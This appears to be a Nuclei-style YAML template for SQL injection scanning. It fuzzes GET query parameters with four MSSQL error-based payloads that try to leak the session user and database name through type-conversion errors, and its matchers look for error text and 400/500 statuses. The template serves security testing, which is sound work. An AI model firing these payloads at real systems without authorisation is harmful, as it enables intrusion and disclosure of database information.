id: fuzz-sqli-custom

info:
  name: Custom SQL Injection Detection
  author: netbaan
  severity: high
  description: |
    This template is designed to detect SQL Injection vulnerabilities with various payloads.

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'  # Run only on GET requests

    payloads:
      sqli_payloads:
        - "%2buser_name(convert(int,(SESSION_USER))) -- "
        - "%2buser_name(UPPER(\'sql+tutorial+is+fun!\')) -- "
        - "%2buser_name(IIF(5=4, \'YES\', \'HackedBy_c0nqr0r&0x4m\')) -- "
        - "%2buser_name(convert(int,(db_name()))) -- "

    stop-at-first-match: true

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{sqli_payloads}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "error"    # Adjust based on actual application responses
          - "SQL syntax"  # Example matchers to confirm SQLi
          - "database"  # Example matchers indicating SQL errors

      - type: status
        status:
          - 500  # HTTP status indicating server error
          - 400  # HTTP status indicating bad request